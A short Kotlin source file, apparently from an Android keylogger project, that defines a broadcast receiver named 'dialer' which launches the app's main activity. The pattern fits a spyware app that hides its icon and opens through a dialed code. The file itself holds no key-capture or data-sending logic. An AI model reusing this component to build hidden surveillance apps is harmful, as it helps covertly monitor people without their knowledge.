package com.mr.programmerlab.androidkeylogger

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class dialer : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        // Declare Here your launcher activity in Intent
        var i: Intent = Intent(context, MainActivity::class.java).also { it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
        context!!.startActivity(i);
    }
}